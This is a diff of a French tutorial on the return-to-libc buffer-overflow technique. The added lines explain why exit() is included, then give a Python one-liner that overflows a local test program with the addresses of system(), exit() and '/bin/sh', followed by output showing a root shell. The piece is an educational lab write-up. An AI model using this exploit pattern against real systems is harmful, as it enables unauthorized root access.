@@ -131,10 +131,25 @@ Nous allons lancer `GDB` (GNU Debugger), et nous allons chercher l'adresse de la
     
 Donc, nous avons réussis à capturer les adresses de `system();`, `exit()` et finalement de la chaîne "`/bin/sh"`.
 
-- `system();` : `0xf7e17660
+- `system();` : `0xf7e17660`
 - `exit();`   : `0xf7e0a6f0`
 - `/bin/sh`   : `0xf7f54f68`
 
 ![forthebadge made-with-python](https://fundacion-sadosky.github.io/guia-escritura-exploits/esoteric/imagenes/ret-2-libc.png)
 
-Il suffit maintenant d'utiliser les adresses que nous avons capturer contre le programme afin de `pop` un shell.
+Il suffit maintenant d'utiliser les adresses que nous avons capturer contre le programme afin de `pop` un shell. Si nous avons pris la fonction `exit()`, c'est pour simplement quitter le shell de manière correct, car si nous mettons pas la fonction `exit();`, et que nous quittons le shell, il nous affichera un beau `segfault`, donc pas très beau à voir, vous n'êtes pas obliger de le mettre n'empêche, c'est totalement facultatif.
+
+    root@0XEX75:~/libc# ./libc $(python -c 'print "A"*22 + "\x60\x76\xe1\xf7" + "\xf0\xa6\xe0\xf7" + "\x68\x4f\xf5\xf7"')
+    Your name : AAAAAAAAAAAAAAAAAAAAAA`vhO
+    # whoami
+    root
+    # id
+    uid=0(root) gid=0(root) groupes=0(root)
+    
+BINGO, mission réussi !
+
+![forthebadge made-with-python](https://media.giphy.com/media/XqXDNFZREKMBq/giphy.gif)
+
+# CONCLUSION !
+
+Voilà, nous arrivons enfin au bout de cet article qui, je l’espère, vous aura plus. J'ai essayer de vous expliquez le fonctionnement de la `technique de la retourne à la libc`, n'hésitez pas à me contacter sur les réseaux sociaux, je suis toujours disponible pour vous répondre.
